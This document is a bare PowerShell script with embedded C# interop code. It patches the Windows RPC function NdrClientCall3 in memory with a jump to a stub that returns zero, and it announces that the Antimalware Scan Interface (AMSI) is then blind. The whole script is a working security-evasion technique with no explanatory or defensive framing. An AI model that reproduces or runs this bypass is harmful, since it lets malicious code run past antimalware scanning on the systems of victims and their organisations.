Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Mem {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}

public class Patch {
    public static int Trampoline() {
        return 0;
    }
}
"@

# Constants
$PAGE_EXECUTE_READWRITE = 0x40
$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PATCH_SIZE = 12

# Get address of the trampoline
$trampoline = [IntPtr][Patch].GetMethod("Trampoline").MethodHandle.GetFunctionPointer()

# Exit if trampoline allocation failed
if ($trampoline -eq [IntPtr]::Zero) {
    Write-Error "[-] Failed to resolve trampoline address."
    return
}

# Get function address
$lib = [Mem]::LoadLibrary("rpcrt4.dll")
$func = [Mem]::GetProcAddress($lib, "NdrClientCall3")
if ($func -eq [IntPtr]::Zero) {
    Write-Error "[-] Failed to locate NdrClientCall3."
    return
}

# Unprotect target memory
$oldProtect = 0
[Mem]::VirtualProtect($func, [UIntPtr]::op_Explicit($PATCH_SIZE), $PAGE_EXECUTE_READWRITE, [ref]$oldProtect) | Out-Null

# Write patch: mov rax, trampoline; jmp rax
$trampAddr = $trampoline.ToInt64()
$patch = [byte[]](0x48, 0xB8) + [BitConverter]::GetBytes($trampAddr) + [byte[]](0xFF, 0xE0)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $func, $patch.Length)

Write-Host "[+] NdrClientCall3 patched (CFG-safe trampoline). AMSI blind now."
